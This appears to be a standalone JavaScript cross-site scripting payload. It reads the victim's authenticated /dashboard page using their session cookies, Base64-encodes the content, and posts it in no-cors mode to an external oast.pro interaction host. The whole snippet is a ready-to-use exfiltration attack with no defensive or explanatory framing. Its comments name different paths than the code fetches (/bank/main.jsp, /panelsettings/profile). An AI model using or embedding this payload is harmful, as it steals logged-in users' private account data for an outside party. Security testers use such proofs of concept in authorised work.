(async () => {
    // Fetch the DOM content of /bank/main.jsp
    const response = await fetch('/dashboard', {
        method: 'GET',
        credentials: 'include', // Include cookies for authenticated requests
    });

    // Check if the response is OK
    if (response.ok) {
        const domContent = await response.text(); // Get the response as text

        // Encode the DOM content in Base64 for safe transmission
        const encodedDOM = btoa(domContent);

        // Send the encoded DOM to your server using 'no-cors'
        await fetch('https://cttquupntu5rdc61106gsdsbrxw15ikub.oast.pro', {
            method: 'POST',
            mode: 'no-cors', // Bypass CORS but limits response visibility
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ data: encodedDOM }),
        });
    } else {
        console.error('Failed to fetch /panelsettings/profile:', response.status);
    }
})();
